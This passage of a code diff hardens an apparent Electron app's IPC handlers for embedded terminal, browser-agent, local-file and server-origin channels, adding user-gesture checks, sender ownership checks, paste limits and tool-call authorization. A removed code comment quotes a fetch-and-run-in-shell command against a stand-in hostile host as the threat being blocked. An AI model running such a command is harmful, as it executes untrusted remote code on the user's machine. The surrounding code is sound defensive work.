+          return { ...deps.terminal.restoreScope(scope), scopeId: scope }
         } catch (error) {
-          const failure = error as { code?: string; message?: string }
-          return {
-            ok: false,
-            code: failure.code ?? 'SPAWN_FAILED',
-            error: failure.message ?? 'Could not open a terminal.',
-          }
+          logger.warn('Could not restore saved terminals', { error: getErrorMessage(error) })
+          return { ...deps.terminal.getTabs(scope), scopeId: scope }
         }
       },
     },
@@ -1349,7 +1653,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         ) {
           return { ok: false, error: `Unknown terminal tool: ${String(tool)}` }
         }
-        const call = isRecordLike(params) ? params : {}
+        const call = toRecord(params)
         if (!isTerminalOperation(call.operation)) {
           return { ok: false, error: `Unknown terminal operation: ${String(call.operation)}` }
         }
@@ -1379,24 +1683,36 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (scope) deps.terminal.setPanelFocused(scope, focused === true, sender as WebContents)
       },
     },
+    'terminal:visible': {
+      kind: 'send',
+      gate: 'app-origin',
+      requires: 'terminal',
+      passSender: true,
+      handler: (sender, visible, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (scope) deps.terminal.setPanelVisible(scope, visible === true, sender as WebContents)
+      },
+    },
     'terminal:paste': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
       passSender: true,
       denied: false,
-      // The bytes come from the clipboard here, not from the caller, so this
-      // does not need the write gate: a compromised renderer can only replay
-      // what the user already copied. It still needs a real gesture, because
-      // the legitimate caller is a Paste click or ⌘V.
+      // Paste is the sole interactive operation whose bytes do not originate
+      // in the renderer. The shell reads the clipboard itself after a fresh
+      // click/shortcut and still requires visible, focused active-tab
+      // ownership below.
       needsUserActivation: true,
       handler: (sender, terminalId, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string') return false
         const text = clipboard.readText()
         if (!text) return false
-        deps.terminal.write(scope, terminalId, text)
-        return true
+        if (utf8ByteLength(text, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) {
+          return 'too-large'
+        }
+        return writeTerminalText(deps.terminal, scope, terminalId, text, sender as WebContents)
       },
     },
     'terminal:scrollback': {
@@ -1487,10 +1803,19 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: false,
-      handler: (rawScope) => {
+      handler: (sender, rawScope) => {
         const scope = parseDesktopScope(rawScope)
-        if (!scope || !isPendingDesktopScopeId(scope)) return false
+        const contents = sender as WebContents
+        if (
+          !scope ||
+          !isPendingDesktopScopeId(scope) ||
+          !terminalPendingScopesBySender.get(contents)?.has(scope)
+        ) {
+          return false
+        }
+        consumePendingScope(terminalPendingScopesBySender, contents, scope)
         deps.terminal.disposeScope(scope)
         return true
       },
@@ -1499,10 +1824,18 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: false,
-      handler: (rawScope) => {
+      handler: (sender, rawScope) => {
         const scope = parseDesktopScope(rawScope)
-        if (!scope || isPendingDesktopScopeId(scope)) return false
+        const contents = sender as WebContents
+        if (
+          !scope ||
+          isPendingDesktopScopeId(scope) ||
+          terminalScopeBySender.get(contents) !== scope
+        ) {
+          return false
+        }
         const suspended = deps.terminal.suspendScope(scope)
         if (suspended) {
           deps.scopeEvents.sendTerminal(scope, 'terminal:scope-suspended', scope)
@@ -1532,12 +1865,31 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       requires: 'terminal',
       passSender: true,
       denied: { tabs: [], activeTerminalId: null },
-      handler: (sender, terminalId, rawScope) => {
+      handler: (sender, terminalId, rawScope, rawOptions) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return { tabs: [], activeTerminalId: null }
+        const claim = !(isRecordLike(rawOptions) && rawOptions.claim === false)
+        const tabs =
+          typeof terminalId === 'string'
+            ? deps.terminal.switchTerminal(scope, terminalId, { claim })
+            : deps.terminal.getTabs(scope)
+        return { ...tabs, scopeId: scope }
+      },
+    },
+    'terminal:reorder': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      passSender: true,
+      denied: { tabs: [], activeTerminalId: null },
+      handler: (sender, terminalId, targetIndex, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope) return { tabs: [], activeTerminalId: null }
         const tabs =
-          typeof terminalId === 'string'
-            ? deps.terminal.switchTerminal(scope, terminalId)
+          typeof terminalId === 'string' &&
+          typeof targetIndex === 'number' &&
+          Number.isFinite(targetIndex)
+            ? deps.terminal.reorderTerminal(scope, terminalId, targetIndex)
             : deps.terminal.getTabs(scope)
         return { ...tabs, scopeId: scope }
       },
@@ -1547,13 +1899,15 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'terminal',
       passSender: true,
+      needsUserActivation: true,
       denied: { tabs: [], activeTerminalId: null },
       handler: (sender, terminalId, rawScope) => {
-        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        const contents = sender as WebContents
+        const scope = activeRendererScope(terminalScopeBySender, contents, rawScope)
         if (!scope) return { tabs: [], activeTerminalId: null }
         const tabs =
           typeof terminalId === 'string'
-            ? deps.terminal.closeTerminal(scope, terminalId)
+            ? deps.terminal.closeUserTerminal(scope, terminalId, contents)
             : deps.terminal.getTabs(scope)
         return { ...tabs, scopeId: scope }
       },
@@ -1566,19 +1920,15 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, terminalId, data, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string' || typeof data !== 'string') return
-        deps.terminal.write(scope, terminalId, data)
+        if (data.length === 0 || data.length > MAX_TERMINAL_WRITE_CHARS) return
+        if (data.length <= MAX_PTY_REPLY_CHARS && PTY_REPLY.test(data)) {
+          writeTerminalText(deps.terminal, scope, terminalId, data)
+          return
+        }
+        const contents = sender as WebContents
+        if (!hasRecentDeliberateInput(contents)) return
+        writeTerminalText(deps.terminal, scope, terminalId, data, contents)
       },
-      // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
-      // Panel focus is deliberately not used — `terminal:focused` is a
-      // renderer-asserted claim the same attacker can set.
-      //
-      // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
-      // line buffer, where the user's own next Enter submits it — visible on
-      // screen, but not prevented. Closing that needs the interactive path off
-      // the renderer surface entirely (main writing the keystrokes it already
-      // observes) or the terminal in its own WebContents, neither of which is a
-      // gate change. Tracked as follow-up.
-      payloadNeedsDeliberateInput: true,
     },
     'terminal:resize': {
       kind: 'send',
@@ -1588,7 +1938,6 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, terminalId, cols, rows, rawScope) => {
         // `typeof NaN === 'number'`, and the downstream `cols <= 0` guard is
         // false for NaN, so an unfinite value reached pty.resize() intact.
-        // Matches the clamping terminal:start already applies to these fields.
         if (typeof terminalId !== 'string') return
         if (!isPositiveFinite(cols) || !isPositiveFinite(rows)) return
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
@@ -1596,57 +1945,125 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         deps.terminal.resize(scope, terminalId, toCellCount(cols, 1), toCellCount(rows, 1))
       },
     },
-    'terminal:dispose': {
-      kind: 'send',
-      gate: 'app-origin',
-      deviationReason:
-        'tearing the surface down must survive the surface being off, or a terminal left running when the feature was disabled could never be reaped',
-      handler: () => deps.terminal.dispose(),
-    },
     'offline:retry': {
       kind: 'send',
       gate: 'local-page',
       passSender: true,
       handler: (sender) => deps.retryLoad(sender as WebContents),
     },
+    // The `server:` family is local-page only, and deliberately so: the one
+    // surface that repoints the shell at another deployment must keep working
+    // when the current one is unreachable (the offline page is where a
+    // self-hoster with a typo'd origin actually lands), and must never be
+    // drivable by a page the current server serves.
+    'server:open': {
+      kind: 'send',
+      gate: 'local-page',
+      handler: () => deps.server.open(),
+    },
+    'server:get-configuration': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: null,
+      handler: () => deps.server.getConfiguration(),
+    },
+    'server:set-origin': {
+      kind: 'invoke',
+      gate: 'local-page',
+      denied: { ok: false, error: 'The server can only be changed from the Sim app itself.' },
+      handler: (origin) =>
+        typeof origin === 'string'
+          ? deps.server.setOrigin(origin)
+          : { ok: false, error: 'Server URL is required' },
+    },
   }
 
   const senderAllowed = (event: IpcMainEvent | IpcMainInvokeEvent, gate: ChannelGate): boolean => {
     if (gate === 'any') return true
     if (gate === 'app-origin') return isAppOriginSender(event, deps.appOrigin())
+    if (gate === 'app-or-local-page') {
+      return (
+        isAppOriginSender(event, deps.appOrigin()) || isLocalPageSender(event, deps.isLocalPageUrl)
+      )
+    }
     if (gate === 'browser-page') return isAgentWebContents(event.sender)
-    return isLocalPageSender(event)
+    return isLocalPageSender(event, deps.isLocalPageUrl)
   }
 
   const featureAllowed = (feature: ChannelFeature | undefined): boolean => {
     if (!feature) return true
+    if (!deps.accountDataAvailable()) return false
     const preferences = deps.settings.getPreferences()
     return feature === 'browser' ? preferences.browserEnabled : preferences.terminalEnabled
   }
 
+  const accountDataAllowed = (spec: ChannelSpec): boolean =>
+    spec.requiresAccountData !== true || deps.accountDataAvailable()
+
+  const requiresUserActivation = (
+    requirement: ChannelSpecBase['needsUserActivation'],
+    args: readonly unknown[]
+  ): boolean => (typeof requirement === 'function' ? requirement(args) : requirement === true)
+
   for (const [channel, spec] of Object.entries(channels)) {
     if (spec.kind === 'invoke') {
       ipcMain.handle(channel, async (event, ...args) => {
-        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return spec.denied
-        if (spec.needsUserActivation && !senderHasUserGesture(event)) {
+        if (
+          !senderAllowed(event, spec.gate) ||
+          !featureAllowed(spec.requires) ||
+          !accountDataAllowed(spec)
+        ) {
+          return spec.denied
+        }
+        if (
+          requiresUserActivation(spec.needsUserActivation, args) &&
+          !senderHasUserGesture(event)
+        ) {
           return spec.denied
         }
         let handlerArgs = args
         if (channel === 'browser-agent:execute-tool') {
+          const toolCallId = args[0]
           const requestedTool = args[1]
-          const authorization = await fetchDesktopToolAuthorization(event, deps, args[0])
+          const requestedScope = parseDesktopScope(args[3])
           if (
-            !authorization ||
+            !isDesktopToolCallId(toolCallId) ||
             typeof requestedTool !== 'string' ||
-            authorization.toolName !== requestedTool ||
-            !isBrowserToolName(authorization.toolName)
+            !isCurrentBrowserToolName(requestedTool) ||
+            !requestedScope
           ) {
             return {
               ok: false,
               error: 'This browser action is not an authorized pending Copilot tool call.',
             }
           }
-          handlerArgs = [authorization.chatId, authorization.toolName, authorization.args]
+          const authorizationBoundary = captureBrowserToolQueueBoundary(requestedScope)
+          if (!authorizationBoundary) {
+            return {
+              ok: false,
+              error:
+                'Sim already has too many browser actions queued. Wait for earlier actions to finish.',
+            }
+          }
+          const authorization = await fetchDesktopToolAuthorization(event, deps, toolCallId)
+          if (
+            !authorization ||
+            authorization.chatId !== requestedScope ||
+            authorization.toolName !== requestedTool
+          ) {
+            releaseBrowserToolQueueBoundary(authorizationBoundary)
+            return {
+              ok: false,
+              error: 'This browser action is not an authorized pending Copilot tool call.',
+            }
+          }
+          handlerArgs = [
+            authorization.chatId,
+            toolCallId,
+            authorization.toolName,
+            authorization.args,
+            authorizationBoundary,
+          ]
         }
         if (channel === 'terminal:execute-tool') {
           const requestedTool = args[1]
@@ -1688,6 +2105,32 @@ export function registerIpcHandlers(deps: IpcDeps): void {
             error: 'This local filesystem request is not an authorized pending Copilot tool call.',
           }
         }
+        if (channel === 'desktop:local-files') {
+          const request = args[0]
+          if (!isRecordLike(request)) return { ok: false, error: 'Invalid local file request.' }
+          let failureStatus: number | undefined
+          const authorization = await fetchDesktopToolAuthorization(
+            event,
+            deps,
+            request.toolCallId,
+            request.operation === 'manifest',
+            (status) => {
+              failureStatus = status
+            }
+          )
+          if (failureStatus === 409)
+            return {
+              ok: false,
+              code: 'ALREADY_STARTED',
+              error: 'This import is already running or was already started.',
+            }
+          if (
+            !authorization ||
+            !['read_local_file', 'import_local_files'].includes(authorization.toolName)
+          )
+            return { ok: false, error: 'This is not an authorized pending local file tool call.' }
+          handlerArgs = [request, authorization]
+        }
         if (spec.passSender) {
           handlerArgs = [event.sender, ...handlerArgs]
         }
@@ -1695,11 +2138,16 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       })
     } else {
       ipcMain.on(channel, (event, ...args) => {
-        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
         if (
-          spec.payloadNeedsDeliberateInput &&
-          needsDeliberateInputForWrite(args) &&
-          !hasRecentDeliberateInput(event.sender)
+          !senderAllowed(event, spec.gate) ||
+          !featureAllowed(spec.requires) ||
+          !accountDataAllowed(spec)
+        ) {
+          return
+        }
+        if (
+          requiresUserActivation(spec.needsUserActivation, args) &&
+          !senderHasUserGesture(event)
         ) {
           return
         }
